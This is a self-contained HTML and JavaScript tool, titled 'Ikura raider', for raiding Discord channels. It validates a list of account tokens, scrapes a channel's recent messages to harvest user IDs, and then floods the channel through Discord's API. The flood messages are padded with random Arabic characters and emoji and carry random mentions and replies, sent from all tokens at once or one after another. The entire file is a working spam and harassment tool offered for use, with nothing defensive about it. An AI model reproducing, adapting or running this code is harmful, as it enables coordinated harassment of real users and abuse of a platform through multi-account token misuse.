<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>Ikura raider lol</title>
    <style>
        body { margin: 0; padding: 0; font-family: 'Consolas', monospace; background: linear-gradient(135deg, #0d0d0d, #1a1a2e); color: #00ffcc; display: flex; justify-content: center; min-height: 100vh; padding: 20px; }
        .container { background: rgba(0, 0, 0, 0.95); border: 1px solid #00ffcc; padding: 25px; border-radius: 10px; box-shadow: 0 0 20px #00ffcc; width: 100%; max-width: 850px; }
        h2 { text-align: center; text-transform: uppercase; letter-spacing: 5px; margin-bottom: 20px; }
        label { display: block; margin-top: 15px; font-size: 0.8em; color: #00ffcc; }
        textarea, input, select { width: 100%; padding: 10px; border: 1px solid #00ffcc; background: #000; color: #fff; border-radius: 4px; box-sizing: border-box; outline: none; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
        .checkbox-group { display: flex; flex-wrap: wrap; gap: 15px; margin: 15px 0; padding: 10px; border: 1px dashed #00ffcc; }
        .checkbox-group label { display: flex; align-items: center; margin: 0; cursor: pointer; }
        input[type="checkbox"] { width: auto; margin-right: 8px; }
        button { width: 100%; padding: 15px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; transition: 0.3s; margin-top: 10px; text-transform: uppercase; }
        .btn-check { background: transparent; border: 1px solid #00ffcc; color: #00ffcc; }
        .btn-start { background: #ff0055; color: #fff; font-size: 1.2em; }
        .btn-stop { background: #555; color: #fff; font-size: 1.2em; }
        button:hover { filter: brightness(1.3); box-shadow: 0 0 15px currentColor; }
        #log { margin-top: 20px; height: 150px; overflow-y: auto; background: #000; padding: 10px; font-size: 0.75em; border: 1px solid #333; color: #0f0; }
    </style>
</head>
<body>

<div class="container">
    <h2>Ikura raider</h2>

    <label>Tokens (1 line per token)</label>
    <textarea id="tokens" placeholder="Enter tokens..."></textarea>

    <div class="grid">
        <div>
            <label>Channel ID</label>
            <input type="text" id="channelId">
        </div>
        <div>
            <label>Delay (ms)</label>
            <input type="number" id="delay" value="1000">
        </div>
        <div>
            <label>Mention Count (per msg)</label>
            <input type="number" id="mentionCount" value="1" min="1" max="10">
        </div>
    </div>

    <div class="checkbox-group">
        <label><input type="checkbox" id="enableArabic" checked> Arabic & Emoji Mix</label>
        <label><input type="checkbox" id="enableMention"> Random Mention</label>
        <label><input type="checkbox" id="enableReply"> Deep Random Reply</label>
    </div>

    <label>Target User IDs (Auto-filled)</label>
    <textarea id="userIds" placeholder="User IDs..."></textarea>
    <button class="btn-check" onclick="deepScrape()">Deep Scrape (1000 Messages)</button>

    <label>Base Messages (Comma separated)</label>
    <textarea id="messages" placeholder="Hello, Raid, Target..."></textarea>

    <div class="grid">
        <button class="btn-check" onclick="checkTokens()">Check Tokens</button>
        <select id="mode" style="margin-top:10px;">
            <option value="1">Mode 1: Simultaneous</option>
            <option value="2">Mode 2: Sequential</option>
        </select>
    </div>

    <button id="mainBtn" class="btn-start" onclick="toggleRaid()">Start Operation</button>

    <div id="log">Awaiting command...</div>
</div>

<script>
    let isRunning = false;
    let msgHistory = [];

    const logger = (m) => {
        const b = document.getElementById('log');
        b.innerHTML = `<div>[${new Date().toLocaleTimeString()}] ${m}</div>` + b.innerHTML;
    };

    const genChaosString = () => {
        const ar = "ذرزسشصضطظعغفقكلمنهويابتثجحخد";
        const em = ["🔥", "💀", "💢", "⚡", "⚠️", "🩸", "🏴‍☠️", "☣️", "☢️", "🚫", "🆘", "👺", "👻", "👽", "👾", "🤖", "🦾", "🔪", "🧨", "💣", "🛸", "❓", "🧿", "☄️", "💥", "🌀", "👹", "💎", "⛓️", "💉", "🪦", "⚰️", "🚬", "🥀", "⛓️‍💥", "🔌", "💻", "🕶️", "🎩", "🦿", "🧬", "👁️‍🗨️", "🧠", "🦷", "🕸️", "♟️", "🎱", "🎮", "🃏", "🎴", "🏴", "🚩", "🏁", "✖️", "➕", "💠", "🔱", "➰", "🔘", "🔴", "🔵", "🟣", "⚫", "⚪", "⬛", "⬜", "🔳", "🔲", "🔇", "🔈", "📢", "🚨", "🛡️", "⚔️", "🗡️", "🏹", "🪓", "🔨", "⚒️", "🛠️", "🔧", "🔩", "⚙️", "🗜️", "⚖️", "⛓️", "🔗", "🧪", "🧫", "📡", "🔭", "📡", "🛰️", "🛸", "🌌", "🌑", "🌒", "🌓", "🌔", "🌕", "🌙", "🌘", "🌗", "🌖", "🔮", "🕯️", "🏮", "📜", "🗝️", "🔑", "🔐", "🔓", "🔒", "🔏", "🖋️", "✒️", "📝", "🗑️", "🧿", "📿", "🕋", "⛪", "🏛️", "🗿", "🌋", "🏚️", "🌃", "🌉", "🎭", "🃏", "🎲", "🎰", "🕹️", "🎮", "📺", "🎞️", "📽️", "📷", "📸", "📼", "📀", "💿", "💾", "💻", "⌨️", "🖥️", "🖨️", "🖱️", "🖲️", "📱", "📲", "☎️", "📞", "📟", "📠", "🔋", "🔌", "🔦", "🕯️", "🪔", "🪙", "💸", "💵", "💴", "💶", "💷", "💳", "💎", "⚖️", "🪜", "🧳", "🌂", "🌂", "🎒", "🎓", "🎩", "👓", "🕶️", "🥽", "🥼", "🧤", "🧣", "🧦", "🧥", "👔", "👕", "👖", "👗", "👘", "🥻", "🩱", "🩲", "🩳", "👙", "👜", "👛", "👝", "🎒", "👞", "👟", "🥾", "👡", "👠", "👢", "🩰", "👑", "🧢", "👒", "🎩", "🎓", "💄", "💍", "💼", "🩸", "🩹", "🩺", "🧪", "🧫", "🧬", "🧪", "🌡️", "🧬", "😠", "😡", "🤬", "🤯", "😳", "🥵", "🥶", "😱", "😨", "😰", "😥", "😓", "🤔", "🧐", "🤨", "😐", "😑", "😶", "🫠", "🤥", "🙄", "😬", "😮‍💨", "🤥", "🫥", "😶‍🌫️", "😏", "😒", "🙄", "😬", "😮‍💨", "🤥", "🫥", "🤡", "👹", "👺", "👻", "💀", "☠️", "👽", "👾", "🤖", "💩", "👿", "😈", "👺", "👹", "💀", "🖤", "🩶", "🤍", "🤎", "❤️‍🔥", "❤️‍🩹", "💔", "❣️", "❌", "⭕", "🛑", "⛔", "🚫", "💢", "⚠️", "🚩", "🏁", "🏴‍☠️", "🔱", "⚜️", "〽️", "⚠️", "🚸", "🔰", "♻️", "✅", "✔️", "☑️", "✖️", "➕", "➖", "➗", "➰", "➿", "〽️", "✳️", "✴️", "❇️", "‼️", "⁉️", "❓", "❔", "❕", "❗", "〰️", "〽️", "⚠️", "🆘", "♨️", "🔕", "🔇", "🔈", "🔇", "🔉", "🔊", "🔔", "🔕", "📣", "📢"];
        let combined = ar.split('').concat(em);
        let s = "";
        
        for(let i=0; i<25; i++) {
            s += combined[Math.floor(Math.random() * combined.length)];
        }
        return s;
    };

    async function deepScrape() {
        const token = document.getElementById('tokens').value.split('\n')[0].trim();
        const cid = document.getElementById('channelId').value;
        if(!token || !cid) return alert("Token and Channel ID required");

        logger("Deep Scraping started (target: 1000 msgs)...");
        msgHistory = [];
        let lastId = null;
        let uids = new Set();

        try {
            for(let i=0; i<20; i++) {
                const url = `https://discord.com/api/v9/channels/${cid}/messages?limit=50${lastId ? `&before=${lastId}` : ''}`;
                const r = await fetch(url, { headers: { 'Authorization': token } });
                const data = await r.json();
                if(!data.length) break;
                data.forEach(m => {
                    msgHistory.push(m.id);
                    uids.add(m.author.id);
                });
                lastId = data[data.length - 1].id;
                await new Promise(res => setTimeout(res, 250));
            }
            document.getElementById('userIds').value = Array.from(uids).join(',');
            logger(`Scraped ${msgHistory.length} messages and ${uids.size} users.`);
        } catch(e) { logger("Scrape Error: " + e); }
    }

    function toggleRaid() {
        const btn = document.getElementById('mainBtn');
        if (!isRunning) {
            isRunning = true;
            btn.innerText = "Stop Operation";
            btn.className = "btn-stop";
            startRaid();
        } else {
            isRunning = false;
            btn.innerText = "Start Operation";
            btn.className = "btn-start";
            logger("RAID STOPPED.");
        }
    }

    async function startRaid() {
        const tks = document.getElementById('tokens').value.split('\n').filter(t => t.trim());
        const cid = document.getElementById('channelId').value;
        const dly = parseInt(document.getElementById('delay').value);
        const md = document.getElementById('mode').value;
        const msgs = document.getElementById('messages').value.split(',');
        const uids = document.getElementById('userIds').value.split(',').filter(u => u.trim());
        const mCount = parseInt(document.getElementById('mentionCount').value);

        if (!cid || tks.length === 0) {
            isRunning = false;
            toggleRaid();
            return alert("Missing Parameters");
        }

        logger("RAID STARTED");

        while (isRunning) {
            const currentTasks = tks.map(async (t) => {
                if(!isRunning) return;
                let base = msgs[Math.floor(Math.random() * msgs.length)].trim();
                let content = base;
                
                if (document.getElementById('enableArabic').checked) {
                    content += "\n" + genChaosString();
                }
                
                if (document.getElementById('enableMention').checked && uids.length > 0) {
                    content += "\n";
                    for(let i=0; i < mCount; i++) {
                        content += `<@${uids[Math.floor(Math.random() * uids.length)].trim()}> `;
                    }
                }
                
                let body = { content: content };
                if (document.getElementById('enableReply').checked && msgHistory.length > 0) {
                    body.message_reference = { message_id: msgHistory[Math.floor(Math.random() * msgHistory.length)] };
                }

                try {
                    const res = await fetch(`https://discord.com/api/v9/channels/${cid}/messages`, {
                        method: 'POST',
                        headers: { 'Authorization': t.trim(), 'Content-Type': 'application/json' },
                        body: JSON.stringify(body)
                    });
                    if (!res.ok) logger(`Error: ${res.status}`);
                } catch (e) { logger("Network Error - Ensure CORS extension is ON"); }
            });

            if (md === "1") {
                await Promise.all(currentTasks);
                await new Promise(r => setTimeout(r, dly));
            } else {
                for (const task of currentTasks) {
                    if(!isRunning) break;
                    await task;
                    await new Promise(r => setTimeout(r, Math.floor(dly / tks.length)));
                }
            }
        }
    }

    async function checkTokens() {
        const tks = document.getElementById('tokens').value.split('\n').filter(t => t.trim());
        for (const t of tks) {
            try {
                const r = await fetch('https://discord.com/api/v9/users/@me', { headers: { 'Authorization': t.trim() } });
                logger(r.ok ? `VALID: ${t.substring(0,10)}` : `DEAD: ${t.substring(0,10)}`);
            } catch(e) { logger("Check Error: CORS blocked."); }
        }
    }
</script>

</body>
</html>
